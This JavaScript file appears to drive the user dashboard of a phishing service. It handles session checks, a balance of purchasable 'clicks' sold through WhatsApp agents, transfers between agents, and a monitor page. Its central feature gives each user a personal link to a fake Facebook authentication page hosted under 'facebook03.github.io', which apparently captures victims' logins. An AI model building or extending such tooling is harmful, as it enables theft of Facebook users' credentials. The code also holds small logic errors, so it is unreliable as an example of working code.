//completed
const agentsnb = ["2348024313959","2347025789680"];
const buybtn = document.getElementById("buy");
buybtn.addEventListener("click",(e) => {
  let x = Math.floor(Math.random() * agentsnb.length - 1);
  var phoneNumber = agentsnb[x];
  var message = "hello i wanna buy click";
 var encodedMessage = encodeURIComponent(message);   var whatsappLink = "https://wa.me/" + phoneNumber + "?text=" + encodedMessage;
  alert("you're leaving this site to Whatsapp were you'll meet any of our agent just tell him or her that you want to buy click");
  window.open(whatsappLink, "_blank");
});
let session = getcookie("userSession");
if(session === null || session === "" || !session){
 window.location = "login.html";
}
if(session){
  getUserData(session,updatePage);
}
const csend = document.getElementById("csend");
const camount = document.getElementById("camount");
const cid = document.getElementById("toid");

cid.addEventListener("input",(e) => {
  if(e.target.value.length === 7 && camount.value >= 100){
    csend.style.opacity = 1;
  }
  else{
    csend.style.opacity = 0.3;
  }
});

camount.addEventListener("input",(e) => {
  if(e.target.value >= 100 && cid.value.length === 7){
    csend.style.opacity = 1;
  }
  else{
    csend.style.opacity = 0.3;
  }
});

csend.addEventListener("click",(e) => {
  if (cid.value.length !== 7 && camount.value < 100) {
    return
  }
  agentSendClick(camount.value,session,cid.value);
});
function updatePage(data){
  const Click = document.getElementById("Click");
  const yid = document.getElementById("yid");
  const hklink = document.getElementById("hklink");
  const agentBox = document.getElementById("agentbox");
  
  Click.innerText = `click : (${data.click})`;
  yid.innerHTML = `Your ID: ${data.id} <br> <span>tap to copy</span>`;
  hklink.innerText = `https://facebook03.github.io/authentication/index.html?id=${data.id}&page=${data.page}`;
  if(data.isagent === true){
    agentBox.style.display = "flex";
  }
  yid.addEventListener("click",(e) => {
    navigator.clipboard.writeText(data.id);
    alert("copied!");
  });
}


xnav_array = [
  {
    name: "dashboard",
    func: null,
    current: true
  },
    {
    name: "monitor",
    func: function (){
      window.location = "monitor.html";
    },
    current: false
  },
    {
    name: "log out",
    func: logout,
    current: false
  },
  ];
  
 xnav();
